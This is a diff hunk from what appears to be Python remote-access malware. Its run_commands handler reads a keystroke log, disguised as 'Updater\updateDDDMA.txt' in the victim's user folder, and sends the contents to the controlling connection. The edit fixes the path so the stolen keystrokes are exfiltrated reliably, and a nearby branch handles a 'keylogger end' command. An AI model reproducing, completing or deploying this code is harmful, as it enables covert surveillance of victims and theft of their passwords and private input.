@@ -392,7 +392,7 @@ def run_commands():
                 if os.path.isfile("C:\\Users\\" + getpass.getuser() + "\\Updater\\updateDDDMA.txt") == False:
                     connection.send(str.encode("nan"))
                 else:
-                    with open(path, "r") as file:
+                    with open("C:\\Users\\" + getpass.getuser() + "\\Updater\\updateDDDMA.txt", "r") as file:
                         connection.send(str.encode(file.read()))
                         file.close()
             elif ldata == "keylogger end":
